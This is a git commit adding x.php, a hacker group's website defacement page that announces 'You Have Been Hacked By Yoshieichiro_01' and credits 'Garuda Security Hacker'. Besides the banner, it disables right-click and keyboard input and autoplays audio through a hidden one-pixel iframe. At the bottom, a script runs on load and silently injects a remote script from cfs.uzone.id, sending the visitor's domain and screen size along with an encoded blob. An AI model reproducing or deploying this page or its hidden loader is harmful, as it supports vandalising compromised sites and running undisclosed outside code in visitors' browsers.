6a7172c8e5a8f0cad4c29bae34d621ebc8e6d04e
Yoshieichiro_01 <32540848+Yoshieichiro01@users.noreply.github.com>
2018-04-13 14:13:56 +0000

    Add files via upload

---
+++ x.php
@@ -0,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Hacked By Yoshieichiro_01 </title>
+    <meta property="og:image" content="https://cdn.pbrd.co/images/4ieIxMy4m.jpg"/>
+    <link rel="shortcut icon" href="http://i.imgur.com/eVt5AkA.gif" />
+    <link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Jura' rel='stylesheet' type='text/css'>
+    <meta name="Author" content="Hacked By Yoshieichiro_01"/>
+    <meta name="copyright" content="You Have Been Hacked By Yoshieichiro_01"/>
+    <meta name="description" content="Garuda Security Hacker"/>
+    <meta name="keywords" content="No Army Can Stop Our Idea"/>
+    <meta property="og:title" content="You Have Been Hacked By Yoshieichiro_01"/></head>
+  </head>
+<script>
+ alert( 'You Have Been Hacked By Yoshieichiro_01' );
+</script>
+<style type="text/css">
+ body{
+  color: #800000;
+  background-color: #000;
+  background-image: url(http://www.publicdomainpictures.net/pictures/190000/velka/black-background-1468370534d5s.jpg); 
+   background-repeat:no-repeat;
+   background-attachment: fixed;
+   background-size: 1300px;
+   background-position:center;
+  margin: 50px auto;
+  font-weight: thin;
+  font-family: 'Electrolize';
+ }
+ #c{
+  margin: 10px auto;
+  position: relative;
+  width: 230px;
+  height: auto;
+ }
+</style>
+  <body>
+  <body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;'>
+    <center>
+      </font><br><a href="https://www.facebook.com/gshofficialpageindonesia/"target="_blank"><img class="irc_mi" src="https://1.bp.blogspot.com/-_HLqmrlUlsY/V5y8NeHPajI/AAAAAAAAACI/gQmDXeIGMB0O5Dw2DetupeHA4WmiJQ5QACLcB/s1600/LOGO-GSH-2-1.png" alt="Gambar terkait" onload="typeof google==='object'&&google.aft&&google.aft(this)" width="280" height="280" style="margin-top: 89px;"><br></a>
+      <font size="6" color="#800000">[<font color="#FFF"> You Have Been Hacked By Yoshieichiro_01<font color="#800000">]<br>
+            <font size="4" color="#800000">[<font color="red"> Garuda Security Hacker<font color="#800000">]<br>
+                  <font size="5" face="Jura" font color="#800000">[<font color="#FFF">No<font color="red"> Army Can Stop <font color="#FFF"> Our Idea <font color="#800000">]</font><br>
+                          <font size="2" color="#FFF">#Greetz<br>
+                            <marquee id="sup" behavior="scroll" direction="up" height="34px" scrolldelay="55" scrollamount="2" onmouseover="document.all.sup.stop()" onmouseout="document.all.sup.start()">
+                              <center>
+                                <span style="font-family:Electrolize;color:#FFF;font-size:25;text-shadow:Lime 0px 0px 10px">
+                                  <p>
+                                    Yukinoshita 47 <br> Snooze <br> _Tuan2Fay_ <br> LoyoID <br> E7B_404<br> 4LV1N_404 <br> Cr4bby P4tty <br> Lyonc <br> Anazvr <br> ZakirDotID <br> Mr.Engkus <br> And All Member Garuda Security Hacker<br> </p>
+                                </span>
+                                </span>
+                            </marquee>
+                            <font size="4" color="#800000">[<font color="#FFF"> yoshieichiro01@gmail.com <font color="#800000">]</font><br/>
+                              </font><br>
+                              </object>
+                              <iframe width="1" height="1" src="https://www.youtube.com/embed/tk36ovCMsU8?rel=0&autoplay=1&loop=1&playlist=m2S4I8-aoW4" frameborder="0" allowfullscreen></iframe></td>
+    </center>
+    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "¶ms=" + "4TtHaUQnUEiP6K%2fc5C582HVlH3eBnL310w7RiUmWBSTaNm6uUiP00NYuRPRd%2brs0UP4n9HK%2bN6FbfQdW93JProXGoLckERh8y830hTbDzEw0IwvmtrYW6buPRBUr0IYdIP3vJ4nhsQkhDMqfOtHM%2fcxQULFAxDOzEJUhUUef5d7YsLK%2fjIFasO2%2fsczF3lcIquhlmBueTqYsnDrS0eAtbecZRzRpYwX6pA8LHhTJY08BmRzuo5C1o%2bbbDNBTcdvlMI%2b18cu5O9OsG8hC4mvAU61MeVae2brKCCzzQ17HlzTQkiXMPG3s25BUhWq8AzezLEWi%2fffsjOdRnggxUazSilMewIch6LeHrDu9Y5lj65mFJNmRRkDyZaApHzTR8ZqLpBpGgHwGlbL7VbWCTN7IcbZKbWTMfgJsz7Wp5r9J5SY0fy3yrlCgD1ZxsSNxQljOJVcJHnwSdNh2rK2BavOaAuvcEK5nEKp84KcJk%2fKoy3xzjknWotQvwCjLBiH1XHAskoYytVseF8xWZu9%2f6qOBZgH1FTh%2btDEqW5LiNAYJGVbGOR6fMgW%2bgFJFzATqSpVuWMOM6oQRabKuU%2fEFMjDqQTwCvdFkVsodBuUna9rIr9o%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
